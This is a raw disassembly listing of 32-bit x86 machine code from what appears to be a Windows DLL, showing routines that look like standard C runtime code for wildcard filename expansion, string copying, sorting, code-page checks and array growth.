10006bd2:	53                   	push   %ebx
10006bd3:	51                   	push   %ecx
10006bd4:	e8 88 01 00 00       	call   0x10006d61
10006bd9:	8b f0                	mov    %eax,%esi
10006bdb:	83 c4 10             	add    $0x10,%esp
10006bde:	89 75 f8             	mov    %esi,-0x8(%ebp)
10006be1:	eb 13                	jmp    0x10006bf6
10006be3:	8d 55 d8             	lea    -0x28(%ebp),%edx
10006be6:	52                   	push   %edx
10006be7:	50                   	push   %eax
10006be8:	51                   	push   %ecx
10006be9:	e8 24 02 00 00       	call   0x10006e12
10006bee:	83 c4 0c             	add    $0xc,%esp
10006bf1:	89 45 f8             	mov    %eax,-0x8(%ebp)
10006bf4:	8b f0                	mov    %eax,%esi
10006bf6:	85 f6                	test   %esi,%esi
10006bf8:	0f 85 88 00 00 00    	jne    0x10006c86
10006bfe:	8b 75 08             	mov    0x8(%ebp),%esi
10006c01:	83 c6 04             	add    $0x4,%esi
10006c04:	89 75 08             	mov    %esi,0x8(%ebp)
10006c07:	8b 06                	mov    (%esi),%eax
10006c09:	85 c0                	test   %eax,%eax
10006c0b:	75 a5                	jne    0x10006bb2
10006c0d:	8b 7d d8             	mov    -0x28(%ebp),%edi
10006c10:	8b 4d dc             	mov    -0x24(%ebp),%ecx
10006c13:	8b c1                	mov    %ecx,%eax
10006c15:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10006c18:	2b c7                	sub    %edi,%eax
10006c1a:	8b f7                	mov    %edi,%esi
10006c1c:	8b d0                	mov    %eax,%edx
10006c1e:	89 75 f8             	mov    %esi,-0x8(%ebp)
10006c21:	c1 fa 02             	sar    $0x2,%edx
10006c24:	83 c0 03             	add    $0x3,%eax
10006c27:	42                   	inc    %edx
10006c28:	c1 e8 02             	shr    $0x2,%eax
10006c2b:	3b ce                	cmp    %esi,%ecx
10006c2d:	89 55 f4             	mov    %edx,-0xc(%ebp)
10006c30:	1b f6                	sbb    %esi,%esi
10006c32:	f7 d6                	not    %esi
10006c34:	23 f0                	and    %eax,%esi
10006c36:	74 2f                	je     0x10006c67
10006c38:	8b c7                	mov    %edi,%eax
10006c3a:	8b d3                	mov    %ebx,%edx
10006c3c:	8b 08                	mov    (%eax),%ecx
10006c3e:	8d 41 01             	lea    0x1(%ecx),%eax
10006c41:	89 45 f0             	mov    %eax,-0x10(%ebp)
10006c44:	8a 01                	mov    (%ecx),%al
10006c46:	41                   	inc    %ecx
10006c47:	84 c0                	test   %al,%al
10006c49:	75 f9                	jne    0x10006c44
10006c4b:	2b 4d f0             	sub    -0x10(%ebp),%ecx
10006c4e:	43                   	inc    %ebx
10006c4f:	8b 45 f8             	mov    -0x8(%ebp),%eax
10006c52:	03 d9                	add    %ecx,%ebx
10006c54:	83 c0 04             	add    $0x4,%eax
10006c57:	42                   	inc    %edx
10006c58:	89 45 f8             	mov    %eax,-0x8(%ebp)
10006c5b:	3b d6                	cmp    %esi,%edx
10006c5d:	75 dd                	jne    0x10006c3c
10006c5f:	8b 55 f4             	mov    -0xc(%ebp),%edx
10006c62:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10006c65:	33 db                	xor    %ebx,%ebx
10006c67:	6a 01                	push   $0x1
10006c69:	ff 75 fc             	push   -0x4(%ebp)
10006c6c:	52                   	push   %edx
10006c6d:	e8 49 e0 ff ff       	call   0x10004cbb
10006c72:	8b f0                	mov    %eax,%esi
10006c74:	83 c4 0c             	add    $0xc,%esp
10006c77:	85 f6                	test   %esi,%esi
10006c79:	75 13                	jne    0x10006c8e
10006c7b:	83 ce ff             	or     $0xffffffff,%esi
10006c7e:	89 75 f8             	mov    %esi,-0x8(%ebp)
10006c81:	e9 85 00 00 00       	jmp    0x10006d0b
10006c86:	8b 7d d8             	mov    -0x28(%ebp),%edi
10006c89:	e9 84 00 00 00       	jmp    0x10006d12
10006c8e:	8b 45 f4             	mov    -0xc(%ebp),%eax
10006c91:	89 7d f8             	mov    %edi,-0x8(%ebp)
10006c94:	8d 04 86             	lea    (%esi,%eax,4),%eax
10006c97:	8b c8                	mov    %eax,%ecx
10006c99:	89 45 e8             	mov    %eax,-0x18(%ebp)
10006c9c:	8b c7                	mov    %edi,%eax
10006c9e:	89 4d f4             	mov    %ecx,-0xc(%ebp)
10006ca1:	3b 45 dc             	cmp    -0x24(%ebp),%eax
10006ca4:	74 5b                	je     0x10006d01
10006ca6:	8b d6                	mov    %esi,%edx
10006ca8:	2b d7                	sub    %edi,%edx
10006caa:	89 55 e4             	mov    %edx,-0x1c(%ebp)
10006cad:	8b 00                	mov    (%eax),%eax
10006caf:	8b d0                	mov    %eax,%edx
10006cb1:	89 45 ec             	mov    %eax,-0x14(%ebp)
10006cb4:	8d 42 01             	lea    0x1(%edx),%eax
10006cb7:	89 45 f0             	mov    %eax,-0x10(%ebp)
10006cba:	8a 02                	mov    (%edx),%al
10006cbc:	42                   	inc    %edx
10006cbd:	84 c0                	test   %al,%al
10006cbf:	75 f9                	jne    0x10006cba
10006cc1:	2b 55 f0             	sub    -0x10(%ebp),%edx
10006cc4:	8d 42 01             	lea    0x1(%edx),%eax
10006cc7:	50                   	push   %eax
10006cc8:	ff 75 ec             	push   -0x14(%ebp)
10006ccb:	89 45 f0             	mov    %eax,-0x10(%ebp)
10006cce:	8b 45 e8             	mov    -0x18(%ebp),%eax
10006cd1:	2b c1                	sub    %ecx,%eax
10006cd3:	03 45 fc             	add    -0x4(%ebp),%eax
10006cd6:	50                   	push   %eax
10006cd7:	51                   	push   %ecx
10006cd8:	e8 ca 33 00 00       	call   0x1000a0a7
10006cdd:	83 c4 10             	add    $0x10,%esp
10006ce0:	85 c0                	test   %eax,%eax
10006ce2:	75 72                	jne    0x10006d56
10006ce4:	8b 45 f8             	mov    -0x8(%ebp),%eax
10006ce7:	8b 55 e4             	mov    -0x1c(%ebp),%edx
10006cea:	8b 4d f4             	mov    -0xc(%ebp),%ecx
10006ced:	89 0c 02             	mov    %ecx,(%edx,%eax,1)
10006cf0:	83 c0 04             	add    $0x4,%eax
10006cf3:	03 4d f0             	add    -0x10(%ebp),%ecx
10006cf6:	89 4d f4             	mov    %ecx,-0xc(%ebp)
10006cf9:	89 45 f8             	mov    %eax,-0x8(%ebp)
10006cfc:	3b 45 dc             	cmp    -0x24(%ebp),%eax
10006cff:	75 ac                	jne    0x10006cad
10006d01:	8b 45 0c             	mov    0xc(%ebp),%eax
10006d04:	89 5d f8             	mov    %ebx,-0x8(%ebp)
10006d07:	89 30                	mov    %esi,(%eax)
10006d09:	8b f3                	mov    %ebx,%esi
10006d0b:	53                   	push   %ebx
10006d0c:	e8 75 e9 ff ff       	call   0x10005686
10006d11:	59                   	pop    %ecx
10006d12:	8b 45 dc             	mov    -0x24(%ebp),%eax
10006d15:	8b d7                	mov    %edi,%edx
10006d17:	2b c2                	sub    %edx,%eax
10006d19:	89 55 e4             	mov    %edx,-0x1c(%ebp)
10006d1c:	83 c0 03             	add    $0x3,%eax
10006d1f:	c1 e8 02             	shr    $0x2,%eax
10006d22:	39 55 dc             	cmp    %edx,-0x24(%ebp)
10006d25:	1b c9                	sbb    %ecx,%ecx
10006d27:	f7 d1                	not    %ecx
10006d29:	23 c8                	and    %eax,%ecx
10006d2b:	89 4d e8             	mov    %ecx,-0x18(%ebp)
10006d2e:	74 18                	je     0x10006d48
10006d30:	8b f1                	mov    %ecx,%esi
10006d32:	ff 37                	push   (%edi)
10006d34:	e8 4d e9 ff ff       	call   0x10005686
10006d39:	43                   	inc    %ebx
10006d3a:	8d 7f 04             	lea    0x4(%edi),%edi
10006d3d:	59                   	pop    %ecx
10006d3e:	3b de                	cmp    %esi,%ebx
10006d40:	75 f0                	jne    0x10006d32
10006d42:	8b 7d d8             	mov    -0x28(%ebp),%edi
10006d45:	8b 75 f8             	mov    -0x8(%ebp),%esi
10006d48:	57                   	push   %edi
10006d49:	e8 38 e9 ff ff       	call   0x10005686
10006d4e:	59                   	pop    %ecx
10006d4f:	5f                   	pop    %edi
10006d50:	5b                   	pop    %ebx
10006d51:	8b c6                	mov    %esi,%eax
10006d53:	5e                   	pop    %esi
10006d54:	c9                   	leave
10006d55:	c3                   	ret
10006d56:	53                   	push   %ebx
10006d57:	53                   	push   %ebx
10006d58:	53                   	push   %ebx
10006d59:	53                   	push   %ebx
10006d5a:	53                   	push   %ebx
10006d5b:	e8 09 e8 ff ff       	call   0x10005569
10006d60:	cc                   	int3
10006d61:	8b ff                	mov    %edi,%edi
10006d63:	55                   	push   %ebp
10006d64:	8b ec                	mov    %esp,%ebp
10006d66:	51                   	push   %ecx
10006d67:	8b 4d 08             	mov    0x8(%ebp),%ecx
10006d6a:	8d 51 01             	lea    0x1(%ecx),%edx
10006d6d:	8a 01                	mov    (%ecx),%al
10006d6f:	41                   	inc    %ecx
10006d70:	84 c0                	test   %al,%al
10006d72:	75 f9                	jne    0x10006d6d
10006d74:	57                   	push   %edi
10006d75:	8b 7d 10             	mov    0x10(%ebp),%edi
10006d78:	2b ca                	sub    %edx,%ecx
10006d7a:	8b c7                	mov    %edi,%eax
10006d7c:	41                   	inc    %ecx
10006d7d:	f7 d0                	not    %eax
10006d7f:	89 4d fc             	mov    %ecx,-0x4(%ebp)
10006d82:	3b c8                	cmp    %eax,%ecx
10006d84:	76 06                	jbe    0x10006d8c
10006d86:	6a 0c                	push   $0xc
10006d88:	58                   	pop    %eax
10006d89:	5f                   	pop    %edi
10006d8a:	c9                   	leave
10006d8b:	c3                   	ret
10006d8c:	53                   	push   %ebx
10006d8d:	56                   	push   %esi
10006d8e:	8d 5f 01             	lea    0x1(%edi),%ebx
10006d91:	03 d9                	add    %ecx,%ebx
10006d93:	6a 01                	push   $0x1
10006d95:	53                   	push   %ebx
10006d96:	e8 8e e8 ff ff       	call   0x10005629
10006d9b:	8b f0                	mov    %eax,%esi
10006d9d:	59                   	pop    %ecx
10006d9e:	59                   	pop    %ecx
10006d9f:	85 ff                	test   %edi,%edi
10006da1:	74 12                	je     0x10006db5
10006da3:	57                   	push   %edi
10006da4:	ff 75 0c             	push   0xc(%ebp)
10006da7:	53                   	push   %ebx
10006da8:	56                   	push   %esi
10006da9:	e8 f9 32 00 00       	call   0x1000a0a7
10006dae:	83 c4 10             	add    $0x10,%esp
10006db1:	85 c0                	test   %eax,%eax
10006db3:	75 50                	jne    0x10006e05
10006db5:	ff 75 fc             	push   -0x4(%ebp)
10006db8:	2b df                	sub    %edi,%ebx
10006dba:	8d 04 3e             	lea    (%esi,%edi,1),%eax
10006dbd:	ff 75 08             	push   0x8(%ebp)
10006dc0:	53                   	push   %ebx
10006dc1:	50                   	push   %eax
10006dc2:	e8 e0 32 00 00       	call   0x1000a0a7
10006dc7:	83 c4 10             	add    $0x10,%esp
10006dca:	85 c0                	test   %eax,%eax
10006dcc:	75 37                	jne    0x10006e05
10006dce:	8b 5d 14             	mov    0x14(%ebp),%ebx
10006dd1:	8b cb                	mov    %ebx,%ecx
10006dd3:	e8 84 03 00 00       	call   0x1000715c
10006dd8:	33 ff                	xor    %edi,%edi
10006dda:	89 45 fc             	mov    %eax,-0x4(%ebp)
10006ddd:	85 c0                	test   %eax,%eax
10006ddf:	74 0c                	je     0x10006ded
10006de1:	56                   	push   %esi
10006de2:	e8 9f e8 ff ff       	call   0x10005686
10006de7:	8b 75 fc             	mov    -0x4(%ebp),%esi
10006dea:	59                   	pop    %ecx
10006deb:	eb 0b                	jmp    0x10006df8
10006ded:	8b 43 04             	mov    0x4(%ebx),%eax
10006df0:	89 30                	mov    %esi,(%eax)
10006df2:	8b f7                	mov    %edi,%esi
10006df4:	83 43 04 04          	addl   $0x4,0x4(%ebx)
10006df8:	57                   	push   %edi
10006df9:	e8 88 e8 ff ff       	call   0x10005686
10006dfe:	59                   	pop    %ecx
10006dff:	8b c6                	mov    %esi,%eax
10006e01:	5e                   	pop    %esi
10006e02:	5b                   	pop    %ebx
10006e03:	eb 84                	jmp    0x10006d89
10006e05:	33 ff                	xor    %edi,%edi
10006e07:	57                   	push   %edi
10006e08:	57                   	push   %edi
10006e09:	57                   	push   %edi
10006e0a:	57                   	push   %edi
10006e0b:	57                   	push   %edi
10006e0c:	e8 58 e7 ff ff       	call   0x10005569
10006e11:	cc                   	int3
10006e12:	8b ff                	mov    %edi,%edi
10006e14:	55                   	push   %ebp
10006e15:	8b ec                	mov    %esp,%ebp
10006e17:	81 ec 98 02 00 00    	sub    $0x298,%esp
10006e1d:	a1 04 30 01 10       	mov    0x10013004,%eax
10006e22:	33 c5                	xor    %ebp,%eax
10006e24:	89 45 fc             	mov    %eax,-0x4(%ebp)
10006e27:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10006e2a:	8b 55 10             	mov    0x10(%ebp),%edx
10006e2d:	53                   	push   %ebx
10006e2e:	57                   	push   %edi
10006e2f:	8b 7d 08             	mov    0x8(%ebp),%edi
10006e32:	89 95 a4 fd ff ff    	mov    %edx,-0x25c(%ebp)
10006e38:	3b cf                	cmp    %edi,%ecx
10006e3a:	74 23                	je     0x10006e5f
10006e3c:	8a 01                	mov    (%ecx),%al
10006e3e:	3c 2f                	cmp    $0x2f,%al
10006e40:	74 17                	je     0x10006e59
10006e42:	3c 5c                	cmp    $0x5c,%al
10006e44:	74 13                	je     0x10006e59
10006e46:	3c 3a                	cmp    $0x3a,%al
10006e48:	74 0f                	je     0x10006e59
10006e4a:	51                   	push   %ecx
10006e4b:	57                   	push   %edi
10006e4c:	e8 af 32 00 00       	call   0x1000a100
10006e51:	59                   	pop    %ecx
10006e52:	59                   	pop    %ecx
10006e53:	8b c8                	mov    %eax,%ecx
10006e55:	3b cf                	cmp    %edi,%ecx
10006e57:	75 e3                	jne    0x10006e3c
10006e59:	8b 95 a4 fd ff ff    	mov    -0x25c(%ebp),%edx
10006e5f:	8a 01                	mov    (%ecx),%al
10006e61:	88 85 ab fd ff ff    	mov    %al,-0x255(%ebp)
10006e67:	3c 3a                	cmp    $0x3a,%al
10006e69:	75 20                	jne    0x10006e8b
10006e6b:	8d 47 01             	lea    0x1(%edi),%eax
10006e6e:	3b c8                	cmp    %eax,%ecx
10006e70:	74 13                	je     0x10006e85
10006e72:	52                   	push   %edx
10006e73:	33 db                	xor    %ebx,%ebx
10006e75:	53                   	push   %ebx
10006e76:	53                   	push   %ebx
10006e77:	57                   	push   %edi
10006e78:	e8 e4 fe ff ff       	call   0x10006d61
10006e7d:	83 c4 10             	add    $0x10,%esp
10006e80:	e9 d6 01 00 00       	jmp    0x1000705b
10006e85:	8a 85 ab fd ff ff    	mov    -0x255(%ebp),%al
10006e8b:	33 db                	xor    %ebx,%ebx
10006e8d:	3c 2f                	cmp    $0x2f,%al
10006e8f:	74 0a                	je     0x10006e9b
10006e91:	3c 5c                	cmp    $0x5c,%al
10006e93:	74 06                	je     0x10006e9b
10006e95:	3c 3a                	cmp    $0x3a,%al
10006e97:	8a c3                	mov    %bl,%al
10006e99:	75 02                	jne    0x10006e9d
10006e9b:	b0 01                	mov    $0x1,%al
10006e9d:	2b cf                	sub    %edi,%ecx
10006e9f:	0f b6 c0             	movzbl %al,%eax
10006ea2:	41                   	inc    %ecx
10006ea3:	89 9d 68 fd ff ff    	mov    %ebx,-0x298(%ebp)
10006ea9:	f7 d8                	neg    %eax
10006eab:	89 9d 6c fd ff ff    	mov    %ebx,-0x294(%ebp)
10006eb1:	56                   	push   %esi
10006eb2:	1b c0                	sbb    %eax,%eax
10006eb4:	89 9d 70 fd ff ff    	mov    %ebx,-0x290(%ebp)
10006eba:	23 c1                	and    %ecx,%eax
10006ebc:	89 9d 74 fd ff ff    	mov    %ebx,-0x28c(%ebp)
10006ec2:	89 85 88 fd ff ff    	mov    %eax,-0x278(%ebp)
10006ec8:	89 9d 78 fd ff ff    	mov    %ebx,-0x288(%ebp)
10006ece:	88 9d 7c fd ff ff    	mov    %bl,-0x284(%ebp)
10006ed4:	e8 90 01 00 00       	call   0x10007069
10006ed9:	50                   	push   %eax
10006eda:	8d 85 68 fd ff ff    	lea    -0x298(%ebp),%eax
10006ee0:	50                   	push   %eax
10006ee1:	57                   	push   %edi
10006ee2:	e8 6e fc ff ff       	call   0x10006b55
10006ee7:	83 c4 0c             	add    $0xc,%esp
10006eea:	8d 8d ac fd ff ff    	lea    -0x254(%ebp),%ecx
10006ef0:	f7 d8                	neg    %eax
10006ef2:	1b c0                	sbb    %eax,%eax
10006ef4:	53                   	push   %ebx
10006ef5:	53                   	push   %ebx
10006ef6:	53                   	push   %ebx
10006ef7:	51                   	push   %ecx
10006ef8:	f7 d0                	not    %eax
10006efa:	23 85 70 fd ff ff    	and    -0x290(%ebp),%eax
10006f00:	53                   	push   %ebx
10006f01:	50                   	push   %eax
10006f02:	ff 15 e4 d0 00 10    	call   *0x1000d0e4
10006f08:	8b f0                	mov    %eax,%esi
10006f0a:	83 fe ff             	cmp    $0xffffffff,%esi
10006f0d:	75 18                	jne    0x10006f27
10006f0f:	ff b5 a4 fd ff ff    	push   -0x25c(%ebp)
10006f15:	53                   	push   %ebx
10006f16:	53                   	push   %ebx
10006f17:	57                   	push   %edi
10006f18:	e8 44 fe ff ff       	call   0x10006d61
10006f1d:	83 c4 10             	add    $0x10,%esp
10006f20:	8b d8                	mov    %eax,%ebx
10006f22:	e9 1c 01 00 00       	jmp    0x10007043
10006f27:	8b 85 a4 fd ff ff    	mov    -0x25c(%ebp),%eax
10006f2d:	8b 48 04             	mov    0x4(%eax),%ecx
10006f30:	2b 08                	sub    (%eax),%ecx
10006f32:	c1 f9 02             	sar    $0x2,%ecx
10006f35:	89 8d 84 fd ff ff    	mov    %ecx,-0x27c(%ebp)
10006f3b:	89 9d 8c fd ff ff    	mov    %ebx,-0x274(%ebp)
10006f41:	89 9d 90 fd ff ff    	mov    %ebx,-0x270(%ebp)
10006f47:	89 9d 94 fd ff ff    	mov    %ebx,-0x26c(%ebp)
10006f4d:	89 9d 98 fd ff ff    	mov    %ebx,-0x268(%ebp)
10006f53:	89 9d 9c fd ff ff    	mov    %ebx,-0x264(%ebp)
10006f59:	88 9d a0 fd ff ff    	mov    %bl,-0x260(%ebp)
10006f5f:	e8 05 01 00 00       	call   0x10007069
10006f64:	50                   	push   %eax
10006f65:	8d 85 ab fd ff ff    	lea    -0x255(%ebp),%eax
10006f6b:	50                   	push   %eax
10006f6c:	8d 85 8c fd ff ff    	lea    -0x274(%ebp),%eax
10006f72:	50                   	push   %eax
10006f73:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
10006f79:	50                   	push   %eax
10006f7a:	e8 07 fb ff ff       	call   0x10006a86
10006f7f:	83 c4 10             	add    $0x10,%esp
10006f82:	f7 d8                	neg    %eax
10006f84:	1b c0                	sbb    %eax,%eax
10006f86:	f7 d0                	not    %eax
10006f88:	23 85 94 fd ff ff    	and    -0x26c(%ebp),%eax
10006f8e:	80 38 2e             	cmpb   $0x2e,(%eax)
10006f91:	75 11                	jne    0x10006fa4
10006f93:	8a 48 01             	mov    0x1(%eax),%cl
10006f96:	84 c9                	test   %cl,%cl
10006f98:	74 2a                	je     0x10006fc4
10006f9a:	80 f9 2e             	cmp    $0x2e,%cl
10006f9d:	75 05                	jne    0x10006fa4
10006f9f:	38 58 02             	cmp    %bl,0x2(%eax)
10006fa2:	74 20                	je     0x10006fc4
10006fa4:	ff b5 a4 fd ff ff    	push   -0x25c(%ebp)
10006faa:	ff b5 88 fd ff ff    	push   -0x278(%ebp)
10006fb0:	57                   	push   %edi
10006fb1:	50                   	push   %eax
10006fb2:	e8 aa fd ff ff       	call   0x10006d61
10006fb7:	83 c4 10             	add    $0x10,%esp
10006fba:	89 85 80 fd ff ff    	mov    %eax,-0x280(%ebp)
10006fc0:	85 c0                	test   %eax,%eax
10006fc2:	75 5c                	jne    0x10007020
10006fc4:	38 9d a0 fd ff ff    	cmp    %bl,-0x260(%ebp)
10006fca:	74 0c                	je     0x10006fd8
10006fcc:	ff b5 94 fd ff ff    	push   -0x26c(%ebp)
10006fd2:	e8 af e6 ff ff       	call   0x10005686
10006fd7:	59                   	pop    %ecx
10006fd8:	8d 85 ac fd ff ff    	lea    -0x254(%ebp),%eax
10006fde:	50                   	push   %eax
10006fdf:	56                   	push   %esi
10006fe0:	ff 15 e8 d0 00 10    	call   *0x1000d0e8
10006fe6:	85 c0                	test   %eax,%eax
10006fe8:	0f 85 4d ff ff ff    	jne    0x10006f3b
10006fee:	8b 85 a4 fd ff ff    	mov    -0x25c(%ebp),%eax
10006ff4:	8b 8d 84 fd ff ff    	mov    -0x27c(%ebp),%ecx
10006ffa:	8b 10                	mov    (%eax),%edx
10006ffc:	8b 40 04             	mov    0x4(%eax),%eax
10006fff:	2b c2                	sub    %edx,%eax
10007001:	c1 f8 02             	sar    $0x2,%eax
10007004:	3b c8                	cmp    %eax,%ecx
10007006:	74 34                	je     0x1000703c
10007008:	68 bc 69 00 10       	push   $0x100069bc
1000700d:	2b c1                	sub    %ecx,%eax
1000700f:	6a 04                	push   $0x4
10007011:	50                   	push   %eax
10007012:	8d 04 8a             	lea    (%edx,%ecx,4),%eax
10007015:	50                   	push   %eax
10007016:	e8 95 2b 00 00       	call   0x10009bb0
1000701b:	83 c4 10             	add    $0x10,%esp
1000701e:	eb 1c                	jmp    0x1000703c
10007020:	38 9d a0 fd ff ff    	cmp    %bl,-0x260(%ebp)
10007026:	74 12                	je     0x1000703a
10007028:	ff b5 94 fd ff ff    	push   -0x26c(%ebp)
1000702e:	e8 53 e6 ff ff       	call   0x10005686
10007033:	8b 85 80 fd ff ff    	mov    -0x280(%ebp),%eax
10007039:	59                   	pop    %ecx
1000703a:	8b d8                	mov    %eax,%ebx
1000703c:	56                   	push   %esi
1000703d:	ff 15 e0 d0 00 10    	call   *0x1000d0e0
10007043:	80 bd 7c fd ff ff 00 	cmpb   $0x0,-0x284(%ebp)
1000704a:	5e                   	pop    %esi
1000704b:	74 0c                	je     0x10007059
1000704d:	ff b5 70 fd ff ff    	push   -0x290(%ebp)
10007053:	e8 2e e6 ff ff       	call   0x10005686
10007058:	59                   	pop    %ecx
10007059:	8b c3                	mov    %ebx,%eax
1000705b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
1000705e:	5f                   	pop    %edi
1000705f:	33 cd                	xor    %ebp,%ecx
10007061:	5b                   	pop    %ebx
10007062:	e8 22 ac ff ff       	call   0x10001c89
10007067:	c9                   	leave
10007068:	c3                   	ret
10007069:	8b ff                	mov    %edi,%edi
1000706b:	55                   	push   %ebp
1000706c:	8b ec                	mov    %esp,%ebp
1000706e:	83 ec 10             	sub    $0x10,%esp
10007071:	6a 00                	push   $0x0
10007073:	8d 4d f0             	lea    -0x10(%ebp),%ecx
10007076:	e8 65 d2 ff ff       	call   0x100042e0
1000707b:	8b 45 f4             	mov    -0xc(%ebp),%eax
1000707e:	ba e9 fd 00 00       	mov    $0xfde9,%edx
10007083:	39 50 08             	cmp    %edx,0x8(%eax)
10007086:	74 0c                	je     0x10007094
10007088:	e8 0b e8 ff ff       	call   0x10005898
1000708d:	33 d2                	xor    %edx,%edx
1000708f:	85 c0                	test   %eax,%eax
10007091:	75 01                	jne    0x10007094
10007093:	42                   	inc    %edx
10007094:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
10007098:	74 0a                	je     0x100070a4
1000709a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000709d:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
100070a4:	8b c2                	mov    %edx,%eax
100070a6:	c9                   	leave
100070a7:	c3                   	ret
100070a8:	8b ff                	mov    %edi,%edi
100070aa:	56                   	push   %esi
100070ab:	8b f1                	mov    %ecx,%esi
100070ad:	80 7e 14 00          	cmpb   $0x0,0x14(%esi)
100070b1:	74 0d                	je     0x100070c0
100070b3:	ff 76 08             	push   0x8(%esi)
100070b6:	e8 cb e5 ff ff       	call   0x10005686
100070bb:	59                   	pop    %ecx
100070bc:	c6 46 14 00          	movb   $0x0,0x14(%esi)
100070c0:	5e                   	pop    %esi
100070c1:	c3                   	ret
100070c2:	8b ff                	mov    %edi,%edi
100070c4:	55                   	push   %ebp
100070c5:	8b ec                	mov    %esp,%ebp
100070c7:	56                   	push   %esi
100070c8:	57                   	push   %edi
100070c9:	8b f1                	mov    %ecx,%esi
100070cb:	e8 d8 ff ff ff       	call   0x100070a8
100070d0:	8b 7d 08             	mov    0x8(%ebp),%edi
100070d3:	8d 46 08             	lea    0x8(%esi),%eax
100070d6:	56                   	push   %esi
100070d7:	57                   	push   %edi
100070d8:	50                   	push   %eax
100070d9:	e8 5f 00 00 00       	call   0x1000713d
100070de:	83 c4 0c             	add    $0xc,%esp
100070e1:	85 c0                	test   %eax,%eax
100070e3:	74 0a                	je     0x100070ef
100070e5:	83 66 0c 00          	andl   $0x0,0xc(%esi)
100070e9:	c6 46 14 00          	movb   $0x0,0x14(%esi)
100070ed:	eb 09                	jmp    0x100070f8
100070ef:	c6 46 14 01          	movb   $0x1,0x14(%esi)
100070f3:	33 c0                	xor    %eax,%eax
100070f5:	89 7e 0c             	mov    %edi,0xc(%esi)
100070f8:	5f                   	pop    %edi
100070f9:	5e                   	pop    %esi
100070fa:	5d                   	pop    %ebp
100070fb:	c2 04 00             	ret    $0x4
100070fe:	8b ff                	mov    %edi,%edi
10007100:	55                   	push   %ebp
10007101:	8b ec                	mov    %esp,%ebp
10007103:	56                   	push   %esi
10007104:	57                   	push   %edi
10007105:	8b f1                	mov    %ecx,%esi
10007107:	e8 9c ff ff ff       	call   0x100070a8
1000710c:	8b 7d 08             	mov    0x8(%ebp),%edi
1000710f:	56                   	push   %esi
10007110:	8d 04 3f             	lea    (%edi,%edi,1),%eax
10007113:	50                   	push   %eax
10007114:	8d 46 08             	lea    0x8(%esi),%eax
10007117:	50                   	push   %eax
10007118:	e8 20 00 00 00       	call   0x1000713d
1000711d:	83 c4 0c             	add    $0xc,%esp
10007120:	85 c0                	test   %eax,%eax
10007122:	74 0a                	je     0x1000712e
10007124:	83 66 0c 00          	andl   $0x0,0xc(%esi)
10007128:	c6 46 14 00          	movb   $0x0,0x14(%esi)
1000712c:	eb 09                	jmp    0x10007137
1000712e:	c6 46 14 01          	movb   $0x1,0x14(%esi)
10007132:	33 c0                	xor    %eax,%eax
10007134:	89 7e 0c             	mov    %edi,0xc(%esi)
10007137:	5f                   	pop    %edi
10007138:	5e                   	pop    %esi
10007139:	5d                   	pop    %ebp
1000713a:	c2 04 00             	ret    $0x4
1000713d:	8b ff                	mov    %edi,%edi
1000713f:	55                   	push   %ebp
10007140:	8b ec                	mov    %esp,%ebp
10007142:	ff 75 0c             	push   0xc(%ebp)
10007145:	e8 1a ef ff ff       	call   0x10006064
1000714a:	59                   	pop    %ecx
1000714b:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000714e:	89 01                	mov    %eax,(%ecx)
10007150:	f7 d8                	neg    %eax
10007152:	1b c0                	sbb    %eax,%eax
10007154:	83 e0 f4             	and    $0xfffffff4,%eax
10007157:	83 c0 0c             	add    $0xc,%eax
1000715a:	5d                   	pop    %ebp
1000715b:	c3                   	ret
1000715c:	8b ff                	mov    %edi,%edi
1000715e:	56                   	push   %esi
1000715f:	8b f1                	mov    %ecx,%esi
10007161:	57                   	push   %edi
10007162:	8b 7e 08             	mov    0x8(%esi),%edi
10007165:	39 7e 04             	cmp    %edi,0x4(%esi)
10007168:	74 04                	je     0x1000716e
1000716a:	33 c0                	xor    %eax,%eax
1000716c:	eb 72                	jmp    0x100071e0
1000716e:	83 3e 00             	cmpl   $0x0,(%esi)
10007171:	75 26                	jne    0x10007199
10007173:	6a 04                	push   $0x4
10007175:	6a 04                	push   $0x4
10007177:	e8 ad e4 ff ff       	call   0x10005629
1000717c:	6a 00                	push   $0x0
1000717e:	89 06                	mov    %eax,(%esi)
10007180:	e8 01 e5 ff ff       	call   0x10005686
10007185:	8b 06                	mov    (%esi),%eax
10007187:	83 c4 0c             	add    $0xc,%esp
1000718a:	85 c0                	test   %eax,%eax
1000718c:	74 18                	je     0x100071a6
1000718e:	89 46 04             	mov    %eax,0x4(%esi)
10007191:	83 c0 10             	add    $0x10,%eax
10007194:	89 46 08             	mov    %eax,0x8(%esi)
10007197:	eb d1                	jmp    0x1000716a
10007199:	2b 3e                	sub    (%esi),%edi
1000719b:	c1 ff 02             	sar    $0x2,%edi
1000719e:	81 ff ff ff ff 7f    	cmp    $0x7fffffff,%edi
100071a4:	76 05                	jbe    0x100071ab
100071a6:	6a 0c                	push   $0xc
100071a8:	58                   	pop    %eax
100071a9:	eb 35                	jmp    0x100071e0
100071ab:	53                   	push   %ebx
100071ac:	6a 04                	push   $0x4
100071ae:	8d 1c 3f             	lea    (%edi,%edi,1),%ebx
100071b1:	53                   	push   %ebx
100071b2:	ff 36                	push   (%esi)
100071b4:	e8 31 0c 00 00       	call   0x10007dea
100071b9:	83 c4 0c             	add    $0xc,%esp
100071bc:	85 c0                	test   %eax,%eax
100071be:	75 05                	jne    0x100071c5
100071c0:	6a 0c                	push   $0xc
100071c2:	5e                   	pop    %esi
100071c3:	eb 10                	jmp    0x100071d5
100071c5:	89 06                	mov    %eax,(%esi)
100071c7:	8d 0c b8             	lea    (%eax,%edi,4),%ecx
100071ca:	8d 04 98             	lea    (%eax,%ebx,4),%eax
100071cd:	89 4e 04             	mov    %ecx,0x4(%esi)
100071d0:	89 46 08             	mov    %eax,0x8(%esi)
100071d3:	33 f6                	xor    %esi,%esi
100071d5:	6a 00                	push   $0x0
100071d7:	e8 aa e4 ff ff       	call   0x10005686
100071dc:	59                   	pop    %ecx
100071dd:	8b c6                	mov    %esi,%eax
100071df:	5b                   	pop    %ebx
100071e0:	5f                   	pop    %edi
100071e1:	5e                   	pop    %esi
100071e2:	c3                   	ret
